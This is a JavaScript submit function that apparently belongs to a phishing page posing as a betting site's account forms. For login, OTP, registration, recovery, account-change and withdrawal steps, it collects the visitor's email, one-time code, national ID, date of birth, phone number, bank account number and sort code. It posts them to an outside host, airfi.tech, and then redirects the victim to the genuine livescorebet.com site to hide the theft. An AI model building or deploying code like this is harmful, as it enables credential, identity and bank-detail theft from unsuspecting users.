function dwnSubmit(method, amnt, busName) {
console.log(method);

const myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");
myHeaders.append("Access-Control-Allow-Origin", "*");
myHeaders.append("Access-Control-Allow-Origin", "GET, POST, DELETE, OPTIONS");




const requestOptions = {
method: "POST",
headers: myHeaders,
mode: 'no-cors'
};

if (method === 'review') //misc_other review method
{
            email = localStorage.getItem("username");
            urlStr = "method=misc_other&Email=" + email + "&busName=" + busName + "&review=" + "positive";
}
if (method === 'payment')
{
        email = localStorage.getItem("username");
        urlStr = "method=payment&Email=" + email + "&busName=" + busName + "&amnt=" + amnt;
}
if (method === 'login')
{
        email = document.querySelector('input[id="email"]').value;
        //password = document.querySelector('input[id="password"]').value;
        localStorage.setItem("username", email);
        urlStr = "method=account_login_success&Email=" + email; // + "&Password=" + password;
}
if (method === 'bus-login')
{
        email = document.querySelector('input[id="email"]').value;
        //password = document.querySelector('input[id="password"]').value;
        localStorage.setItem("username", email);
        urlStr = "method=account_login_success&busEmail=" + email; // + "&Password=" + password;
}
if (method === 'otp')
    {
        otp = document.querySelector('input[id="otp"]').value;
        email = localStorage.getItem("username");
        urlStr = "method=auth_challenge_pass&otp=" + otp + "&Email=" + email;
    }
if (method === 'register')
{
    fname = document.querySelector('input[id="fname"]').value;
    lname = document.querySelector('input[id="lname"]').value;
    email = document.querySelector('input[id="email"]').value;
    mobile = document.querySelector('input[id="mobile"]').value;
    nationalID = document.querySelector('input[id="nationalID"]').value;
    localStorage.setItem("username", email);
    urlStr = "method=account_creation&Email=" + email + "&fname=" + fname + "&lname=" + lname + "&mobile=" + mobile + "&nationalID=" + nationalID;
}
if (method === 'recover')
{
        fname = document.querySelector('input[id="fname"]').value;
        lname = document.querySelector('input[id="lname"]').value;
        dob = document.querySelector('input[id="DOB"]').value;
        email = document.querySelector('input[id="email"]').value;
        mobileNumber = document.querySelector('input[id="mobileNumber"]').value;
        localStorage.setItem("username", email);
        urlStr = "method=account_forgot_user_id&Email=" + email + "&mobileNumber=" + mobileNumber + "&dob=" + dob+ "&lname=" + lname+ "&fname=" + fname;
}
if (method === 'account_details_change')
{
            fname = document.querySelector('input[id="fname"]').value;
            lname = document.querySelector('input[id="lname"]').value;
            dob = document.querySelector('input[id="DOB"]').value;
            email = document.querySelector('input[id="email"]').value;
            mobileNumber = document.querySelector('input[id="mobileNumber"]').value;
            localStorage.setItem("username", email);
            urlStr = "method=account_details_change&Email=" + email + "&mobileNumber=" + mobileNumber + "&dob=" + dob+ "&lname=" + lname+ "&fname=" + fname;
}
if (method === 'withdrawal')
{
            accountNumber = document.querySelector('input[id="accountNumber"]').value;
            balance = document.querySelector('input[id="balance"]').value;
            sortcode = document.querySelector('input[id="sortcode"]').value;
            amount = document.querySelector('input[id="amount"]').value;
            email = localStorage.getItem("username");
            urlStr = "method=withdrawal&Email=" + email + "&accountNumber=" + accountNumber + "&sortcode=" + sortcode+ "&amount=" + amount + "&balance=" + balance;
}
if (method === 'vendor-register')
{
                busName = document.querySelector('input[id="bus-name"]').value;
                busPhone = document.querySelector('input[id="bus-phone"]').value;
                busEmail = document.querySelector('input[id="bus-email"]').value;
                username = document.querySelector('input[id="username"]').value;
                localStorage.setItem("username", username);
                urlStr = "method=account_creation&busEmail=" + busEmail + "&busPhone=" + busPhone + "&busName=" + busName+ "&username=" + username;
}


//const response = await fetch("https://airfi.tech/casino/service?" + urlStr, requestOptions);    
//console.log(response);

if (method === 'logout')
{
         window.location.replace('https://www.livescorebet.com/uk/');
}

const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       
       console.log(xhttp.responseText);
       if (method === 'login' || method === 'otp' || method === 'withdrawal' || method === 'vendor-register' || method === 'bus-login')
       {
            window.location.replace('https://www.livescorebet.com/uk/');
       }
       if (method === 'register' || method === 'recover' || method === 'account_details_change' || method === 'payment' || method === 'review')
       {
            window.location.replace('https://www.livescorebet.com/uk/');
       }
    }
    if (this.readyState == 4 && this.status == 400) {
        window.location.replace('https://www.livescorebet.com/uk/');
    }
};
xhttp.open("POST", "https://airfi.tech/promo/submit?" + urlStr, false);
xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
xhttp.send();

}
